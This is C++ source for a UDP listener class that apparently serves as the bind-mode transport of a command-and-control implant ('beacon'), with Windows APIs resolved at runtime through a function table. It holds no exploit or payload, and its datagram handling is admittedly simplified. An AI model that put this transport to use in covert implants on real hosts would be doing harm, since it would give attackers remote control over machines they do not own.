#include "ConnectorUDP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "utils.h"

void* ConnectorUDP::operator new(size_t sz)
{
	void* p = MemAllocLocal(sz);
	return p;
}

void ConnectorUDP::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(ConnectorUDP));
}

ConnectorUDP::ConnectorUDP()
{
    this->functions = (UDPFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(UDPFUNC));

    this->functions->LocalAlloc   = ApiWin->LocalAlloc;
    this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
    this->functions->LocalFree    = ApiWin->LocalFree;
    this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
    this->functions->GetLastError = ApiWin->GetLastError;
    this->functions->GetTickCount = ApiWin->GetTickCount;

	this->functions->WSAStartup		 = ApiWin->WSAStartup;
	this->functions->WSACleanup		 = ApiWin->WSACleanup;
	this->functions->socket			 = ApiWin->socket;
	this->functions->ioctlsocket	 = ApiWin->ioctlsocket;
	this->functions->WSAGetLastError = ApiWin->WSAGetLastError;
	this->functions->closesocket	 = ApiWin->closesocket;
	this->functions->bind			 = ApiWin->bind;
	this->functions->select			 = ApiWin->select;
	this->functions->__WSAFDIsSet	 = ApiWin->__WSAFDIsSet;
	this->functions->sendto		     = ApiWin->sendto;
	this->functions->recvfrom		 = ApiWin->recvfrom;
	this->functions->shutdown		 = ApiWin->shutdown;
}

BOOL ConnectorUDP::SetConfig(ProfileUDP profile, BYTE* beat, ULONG beatSize)
{
	this->port = profile.port;

	WSAData WSAData;
	if (this->functions->WSAStartup(514u, &WSAData) < 0)
		return FALSE;

	SOCKET sock = this->functions->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1)
		return FALSE;

	struct sockaddr_in saddr = { 0 };
	saddr.sin_family = AF_INET;
	saddr.sin_port = ((this->port >> 8) & 0x00FF) | ((this->port << 8) & 0xFF00); // port
	saddr.sin_addr.s_addr = 0; // INADDR_ANY

	if (this->functions->bind(sock, (struct sockaddr*)&saddr, sizeof(sockaddr)) == -1) {
		this->functions->closesocket(sock);
		return FALSE;
	}

	this->prepend = profile.prepend;
	this->SrvSocket = sock;
	return TRUE;
}

void ConnectorUDP::SendData(BYTE* data, ULONG data_size)
{
    this->recvSize = 0;

    if (data && data_size) {

		if (this->functions->sendto(this->SrvSocket, (const char*)&data_size, 4, 0, (struct sockaddr*)&this->ClientAddr, this->ClientAddrLen) != -1) {
			DWORD index = 0;
			DWORD size = 0;
			DWORD NumberOfBytesWritten = 0;
			while (1) {
				size = data_size - index;
				if (data_size - index > 0x1000)
					size = 0x1000;

				NumberOfBytesWritten = this->functions->sendto(this->SrvSocket, (const char*)(data + index), size, 0, (struct sockaddr*)&this->ClientAddr, this->ClientAddrLen);
				if (NumberOfBytesWritten == -1)
					break;

				index += NumberOfBytesWritten;
				if (index >= data_size)
					break;
			}
		}
    }

	bool alive = false;
	ULONG endTime = this->functions->GetTickCount() + 2500;
	while (this->functions->GetTickCount() < endTime) {

		fd_set readfds;
		readfds.fd_count = 1;
		readfds.fd_array[0] = this->SrvSocket;
		timeval timeout = { 0, 100 };

		int selResult = this->functions->select(0, &readfds, NULL, NULL, &timeout);
		if (selResult == 0) {
			alive = true;
			break;
		}

		if (selResult == SOCKET_ERROR)
			break;

		// Since UDP is connectionless, check if there is data readable
        // This is a simplified check compared to TCP's peek
        if (this->functions->__WSAFDIsSet(this->SrvSocket, &readfds)) {
            alive = true;
            break;
        }
	}

	if (!alive) {
		this->recvSize = -1;
		return;
	}

    DWORD totalBytesAvail = 0;
	int result = this->functions->ioctlsocket(this->SrvSocket, FIONREAD, &totalBytesAvail);
    if (result != -1 && totalBytesAvail >= 4) {

        ULONG dataLength = 0;
        int addrLen = sizeof(struct sockaddr_in);
		if (this->functions->recvfrom(this->SrvSocket, (PCHAR)&dataLength, 4, 0, (struct sockaddr*)&this->ClientAddr, &addrLen) != -1 && dataLength) {

            // Validate client addr didn't change unexpectedly if needed,
            // but for simple UDP beacon response, we update ClientAddrLen
            this->ClientAddrLen = addrLen;

            if (dataLength > this->allocaSize) {
                this->recvData   = (BYTE*)this->functions->LocalReAlloc(this->recvData, dataLength, 0);
                this->allocaSize = dataLength;
            }

            ULONG index = 0;
			int NumberOfBytesRead = 0;
            // UDP packets might not stream like TCP, but we are simulating the protocol structure
            // Assuming the sender sends size first then data chunks.
            // For UDP, we might need to handle datagram boundaries differently,
            // but preserving the logic for now assuming a reliable-like layer isn't fully implemented here
            // or the sender respects the sequence.

            // For UDP, usually we expect the whole datagram or managing fragments manually.
            // Here we just loop to read `dataLength` bytes.

			while (index < dataLength) {
                int bytesToRead = dataLength - index;
                // Note: recvfrom might return a whole packet. If sender sent multiple packets, we read them.
				NumberOfBytesRead = this->functions->recvfrom(this->SrvSocket, (PCHAR)this->recvData + index, bytesToRead, 0, (struct sockaddr*)&this->ClientAddr, &addrLen);

                if (NumberOfBytesRead == -1) break;
                if (NumberOfBytesRead == 0) break;

                index += NumberOfBytesRead;
			}
            this->recvSize = index;
		}
    }
}

BYTE* ConnectorUDP::RecvData()
{
    return this->recvData;
}

int ConnectorUDP::RecvSize()
{
    return this->recvSize;
}

void ConnectorUDP::RecvClear()
{
	if (this->recvData && this->allocaSize) {
		if (this->recvSize > 0)
			memset(this->recvData, 0, this->recvSize);
		else
			memset(this->recvData, 0, this->allocaSize);
	}
}

void ConnectorUDP::Listen()
{
    // For UDP, we just prepare to receive.
    // We wait for the first packet to establish "connection" (know who to talk to).

    this->recvData = (BYTE*)this->functions->LocalAlloc(LPTR, 0x100000);
    this->allocaSize = 0x100000;

	fd_set readfds;
	readfds.fd_count = 1;
	readfds.fd_array[0] = this->SrvSocket;

	while (1) {
		int sel = this->functions->select(0, &readfds, 0, 0, NULL);
		if (sel > 0 && readfds.fd_array[0] == this->SrvSocket) {
            // Data available, we consider this a "connection" or wake up
            // We peek or just let the main loop handle the first Recv
            // But we need to fill ClientAddr

            char buf[1];
            int addrLen = sizeof(struct sockaddr_in);
            int res = this->functions->recvfrom(this->SrvSocket, buf, 1, MSG_PEEK, (struct sockaddr*)&this->ClientAddr, &addrLen);
            if (res != -1) {
                this->ClientAddrLen = addrLen;
                break;
            }
		}
	}
}

void ConnectorUDP::Disconnect()
{
    if (this->allocaSize && this->recvData) {
        memset(this->recvData, 0, this->allocaSize);
        this->functions->LocalFree(this->recvData);
        this->recvData = NULL;
    }

    this->allocaSize = 0;
    this->recvData = 0;
    // UDP doesn't really disconnect, but we can reset
    memset(&this->ClientAddr, 0, sizeof(this->ClientAddr));
    this->ClientAddrLen = 0;
}

void ConnectorUDP::CloseConnector()
{
	this->functions->closesocket(this->SrvSocket);
}
